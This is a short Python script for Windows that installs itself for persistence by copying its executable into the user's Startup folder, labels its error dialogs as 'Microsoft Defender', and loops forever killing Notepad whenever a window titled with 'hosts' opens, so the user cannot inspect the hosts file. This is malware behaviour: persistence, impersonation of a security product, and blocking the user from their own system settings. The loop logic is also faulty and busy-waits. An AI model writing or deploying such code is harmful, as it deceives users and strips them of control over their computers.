import os
import pygetwindow as gw
import tkinter as tk
from tkinter import ttk, messagebox
import pathlib
import shutil
import sys

startup_path = r'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

def addInStartup():
    root = tk.Tk()
    root.withdraw()

    try:
        thisFile = pathlib.Path(sys.executable).resolve()
        shutil.copy(thisFile, startup_path)
    except Exception as e:
        messagebox.showerror('Microsoft Defender', f'{e}')

def blockHostsFile():
    root = tk.Tk()
    root.withdraw()

    while True:
        active_window_rn = gw.getActiveWindow()

        last_title = ''

        if active_window_rn is not None:
            current_window_title = active_window_rn.title
            if not current_window_title == last_title:
                if 'hosts' in current_window_title:
                    os.system('taskkill /f /im notepad.exe')
                    messagebox.showerror('Access denied', 'hosts file is unavailable')

if __name__ == '__main__':
    addInStartup()
    blockHostsFile()